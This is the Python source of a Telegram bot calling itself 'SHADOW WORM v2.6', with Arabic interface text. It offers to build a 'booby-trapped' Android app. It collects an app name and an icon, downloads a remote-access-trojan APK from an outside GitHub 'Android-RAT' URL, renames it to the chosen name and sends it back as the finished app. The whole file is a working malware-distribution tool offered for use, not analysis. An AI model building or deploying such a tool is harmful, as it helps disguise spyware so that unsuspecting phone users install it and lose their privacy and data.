import os
import telebot
from telebot import types
from flask import Flask
import threading
import requests

# --- خادم الويب ---
app = Flask('')
@app.route('/')
def home():
    return "SHADOW WORM IS ONLINE"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

# --- البوت ---
BOT_TOKEN = os.environ.get('BOT_TOKEN')
bot = telebot.TeleBot(BOT_TOKEN)

# رابط بايلود مستقر (Direct Download)
RAW_PAYLOAD_URL = "https://github.com/TheHacker0x00/Android-RAT/raw/master/base.apk" 

user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("📱 إنشاء تطبيق ملغم (APK)", callback_data='create_fake')
    markup.add(btn1)
    bot.send_message(message.chat.id, "💀 **SHΔDØW WORM v2.6**\n\nوحدة التحكم جاهزة.", reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == 'create_fake':
        msg = bot.edit_message_text("✍️ أرسل **اسم التطبيق** الآن:", call.message.chat.id, call.message.message_id)
        bot.register_next_step_handler(msg, get_app_name)

def get_app_name(message):
    user_data[message.chat.id] = {'name': message.text}
    msg = bot.reply_to(message, "🖼️ أرسل **صورة الأيقونة** الآن:")
    bot.register_next_step_handler(msg, process_and_send)

def process_and_send(message):
    if message.content_type == 'photo':
        app_name = user_data[message.chat.id]['name']
        status_msg = bot.reply_to(message, f"⌛ جاري بناء **{app_name}** ورفعه.. انتظر قليلاً.")
        
        try:
            # محاولة تحميل البايلود
            response = requests.get(RAW_PAYLOAD_URL, timeout=30)
            if response.status_code == 200:
                file_path = f"{app_name}.apk"
                with open(file_path, "wb") as f:
                    f.write(response.content)
                
                # التأكد من حجم الملف قبل الإرسال
                if os.path.getsize(file_path) > 0:
                    with open(file_path, "rb") as f:
                        bot.send_document(message.chat.id, f, caption=f"✅ تم البناء بنجاح!\n📌 الاسم: {app_name}")
                    os.remove(file_path)
                    bot.delete_message(message.chat.id, status_msg.message_id)
                else:
                    bot.edit_message_text("❌ خطأ: تم إنشاء ملف فارغ.", message.chat.id, status_msg.message_id)
            else:
                bot.edit_message_text(f"❌ فشل تحميل البايلود الخام (Status: {response.status_code})", message.chat.id, status_msg.message_id)
                
        except Exception as e:
            bot.edit_message_text(f"❌ حدث خطأ تقني: {str(e)}", message.chat.id, status_msg.message_id)
    else:
        bot.reply_to(message, "⚠️ يرجى إرسال صورة فقط.")

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    bot.infinity_polling()
